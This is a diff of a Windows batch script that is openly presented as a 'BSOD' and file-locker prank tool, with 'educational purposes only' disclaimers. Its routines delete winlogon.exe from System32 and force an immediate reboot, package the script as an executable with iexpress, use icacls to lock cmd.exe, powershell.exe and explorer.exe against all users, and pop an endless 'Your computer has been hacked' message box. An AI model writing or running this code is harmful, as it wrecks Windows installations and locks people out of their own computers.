@@ -1,6 +1,11 @@
 ::This script is a remake of just-infinite-bsod
-::However, this extends functionality, using subroutines and ideas already present in the previous script
+::Inspired by various sources
 
+::Note that this script is for educational purposes only
+::The writer of this script is not responsible for any damage caused by this script
+::Recall that this script may cause harmful damages to the computer, use it at your own risk
+
+::This script only works on Windows 10 (not tested on other versions)
 @echo off
 
 ::The default credits part, may be subject to change
@@ -20,11 +25,28 @@ call :Credits_Reference
 echo 1. BlueScreenOfDeath Trigger
 echo 2. File locker
 echo 3. Exit
+echo 4. Prank vbs msgbox
 
 set /p choice=Enter your choice:
 if choice==1 goto BSOD_menu_option && goto Menu
 if choice==2 goto FileLocker && goto Menu
 if choice==3 exit
+if choice==4 goto PrankMsgBox && goto Menu
+::****************************************
+::Prank vbs msgbox
+:PrankMsgBox
+if not exist %~dp0\msgbox.vbs (
+    echo do >> %~dp0\msgbox.vbs
+    ::This is the message box, which will be displayed
+    echo msgbox "Your computer has been hacked by DIRLOVE <3", vbOKOnly, "HACKED" >> %~dp0\msgbox.vbs
+    ::Loop the msgbox indefinitely
+    echo Loop >> %~dp0\msgbox.vbs
+)
+::Run the vbs script
+start %~dp0\msgbox.vbs
+exit /b 0
+
+::****************************************
 ::File locker
 :FileLocker
 ::This subroutine is essential similar to that of :LockProtect, however adding user interaction
@@ -38,6 +60,7 @@ if not exist %lock_path% (
 )
 call :LockProtect %lock_path%
 echo The path to the file has been locked.
+exit /b 0
 ::BSOD menu
 :BSOD_menu_option
 cls
@@ -57,6 +80,9 @@ if %errorLevel% neq 0 (
 ) else (
     call :PathBSOD
 )
+exit /b 0
+::****************************************
+::This is the BSOD trigger for Administrators
 :BSOD_With_Admin
 net session >nul 2>&1
 if %errorLevel% neq 0 (
@@ -70,7 +96,8 @@ else (
     del C:\Windows\System32\winlogon.exe
     shutdown /r /t 0
 )
-
+exit /b 0
+::****************************************
 ::Convert a batch file to an executable file
 ::Note that this step is essential, for the non-Admin BSOD trigger to work
 :ConvertBatToExe
@@ -116,7 +143,9 @@ iexpress /N /Q "%sedfile%"
 
 :: Clean up SED file
 del "%sedfile%"
+exit /b 0
 
+::****************************************
 ::This is the non-Admin BSOD trigger
 :BSOD_NonAdmin
 ::Setup the BSOD cause
@@ -133,7 +162,9 @@ call :SafeLock
 
 ::Directly shutting down the computer
 shutdown /r /t 0
+exit /b 0
 
+::****************************************
 
 ::This is for safety measures =)), ensuring that users cannot delete the file.
 ::Note that this is harmful, since any programs listed here is not usable, even for Administrators.
@@ -144,13 +175,23 @@ call :LockProtect "C:\Users\cmd.exe"
 call :LockProtect "C:\Users\powershell.exe"
 call :LockProtect "C:\Users\explorer.exe"
 call :LockProtect %~dp0
+exit /b 0
+
+::****************************************
 ::Get the unchanged username
+::Maybe unessential by the time of writing
 :GetRealName
 
 for /f "tokens=3 delims=\" %%s in ('echo %userprofile%') do (
 	set realName=%%s
 )
-::Lock a file/directory
+exit /b 0
+
+::****************************************
+::Lock a file/directory, for all users (other than SYSTEM) and Administrators
+::This is powerful, since icacls does not require Administrators rights to be run
+::The only default user, who has rights to this file, is the default SYSTEM user
+
 :LockProtect
 
 icacls "%~1" /reset /t
